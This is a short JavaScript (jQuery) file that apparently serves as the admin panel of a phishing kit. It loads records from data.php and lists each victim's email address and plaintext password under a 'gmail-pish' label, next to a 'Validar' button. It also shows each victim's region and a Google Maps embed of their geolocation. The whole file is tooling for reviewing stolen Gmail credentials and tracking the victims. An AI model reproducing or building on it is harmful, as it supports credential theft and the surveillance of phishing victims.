$.ajax({
    url: 'data.php',
    type: 'GET',
    success: res => {
        $('#contenido').text(JSON.stringify(res));
        res.reverse().forEach(x => {
            var template = `
            <tr id="${x.id}" data-user='${JSON.stringify(x)}'>
                <td class="gmail-pish">${x.username.email}</td>
                <td>
                    <button
                        data-id="${x.id}"
                        onclick="show($(this).attr('data-id'))">
                        Mostrar +
                    </button>
                    <button>Validar</button>
                </td>
            </tr>
            `;
            $('#content').append(template);
        });
    },
    error: e=> {

    }
})

function show(id) {
    var data = $(`#${id}`).data('user');
    $('#id').text(data.id);
    $('#email').text(data.username.email);
    $('#pass').text(data.username.pass);
    $('#date').text(data.date);
    $('#continent').text(data.client.continent);
    $('#country').text(data.client.country);
    $('#province').text(data.client.province);
    $('#district').text(data.client.district);
    var latitude = data.client.geolocation.latitude;
    var longitude = data.client.geolocation.longitude;
    var url = `https://www.google.com/maps/embed?origin=mfe&pb=!1m3!2m1!1s${latitude},${longitude}!6i15`;
    $('#g-maps').attr('src', url);
    $('#shower').fadeIn();
}